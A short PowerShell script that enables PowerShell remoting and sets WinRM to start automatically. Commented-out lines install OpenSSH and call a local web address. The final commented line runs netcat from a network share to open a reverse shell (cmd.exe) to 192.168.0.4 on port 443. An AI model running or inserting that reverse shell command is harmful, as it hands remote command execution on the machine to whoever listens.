function Main
{
    <#
    COMMENT
    #>

    ## Install the OpenSSH Client
    #Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

    ## Install the OpenSSH Server
    #Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

    #Get-Service -Name *ssh* | Set-Service -StartupType Automatic;
    #Invoke-RestMethod -Uri 'http://192.168.0.3:8080'

    #echo "Hello world"

    Enable-PSRemoting -Force;

    # Set start mode to automatic
    Set-Service WinRM -StartMode Automatic;

    # Verify start mode and state - it should be running
    Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"};

    #cmd /c \\192.168.0.4\gualdronsito\netcat\nc.exe -e cmd.exe 192.168.0.4 443;
}
Main